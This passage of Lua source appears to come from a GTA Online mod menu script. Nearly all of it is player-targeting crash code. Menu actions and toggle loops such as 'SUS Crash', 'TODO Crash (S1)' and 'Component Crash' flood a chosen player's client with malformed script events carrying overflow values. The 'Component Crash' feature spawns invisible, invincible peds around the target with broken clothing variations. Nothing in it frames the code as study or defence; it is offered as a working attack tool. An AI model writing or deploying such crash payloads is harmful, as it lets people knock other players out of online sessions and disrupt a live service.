        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
        			util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
        			util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
        			util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
        			util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
        			util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
        			util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
        			util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
        			util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
        			util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
        			util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
        			util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
        			util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
        			util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
        			util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
        			util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
        			util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
        			end
        			util.yield()
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
        			util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
        			util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
        			util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
        			util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
        			util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
        			util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
        			util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
        			util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
        			util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
        			util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
        			util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
        			util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
        			util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
        			util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
        			util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
        			util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
        			util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
        			util.trigger_script_event(1 << pid, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
        			util.trigger_script_event(1 << pid, {1348481963, 22, -2147483647})
        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {526822748, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-555356783, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-637352381, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-51486976, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {-1386010354, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        			util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        			util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
        			util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
        			util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
        			util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
        			util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
        			util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
        			util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
        			util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
        			util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
        			util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
        			util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
        			util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
        			util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
        			util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
        			util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
        			util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
        			util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
        			util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    	notification("SUS Crash" .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)


    local scrash = menu.list(crash, "TODO Crash (S1)", {}, "")

    	menu.action(scrash, "TODO Crash (S1)", {"s1crash"}, "", function()
    	notification("TODO Crash (S1) sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
        			end
        			util.yield()
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    	notification("TODO Crashed" .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)

    	menu.toggle_loop(scrash, "TODO Crash (S1)", {"toggles1crash"}, "Note: DO NOT SPECTATE WHEN TOGGLED.", function(on_toggle)
    	notification("TODO Crash (S1) sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
        			end
        			util.yield()
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        			util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    	notification("TODO Crashed (S1) " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)


    local clothescrash = menu.list(crash, "Component Crash", {}, "")

    menu.action(clothescrash, "Component Crash", {"clothescrash"}, "Crash clothes", function()
            if pid ~= players.user() then
                util.toast("Wait 20 Seconds...")
                local math_random = math.random
                local joaat = util.joaat
                util.yield(100)
                local pedhash = util.joaat("P_franklin_02")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds1[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lazlow")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds2 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds2[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds2[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds2[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds2[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds2[i], 3, 0, 3, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds2[i])
                    util.yield(5)
                end
                util.yield(5)
                local pedhash = util.joaat("cs_taocheng")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds3 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds3[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds3[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds3[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds3[i], true)
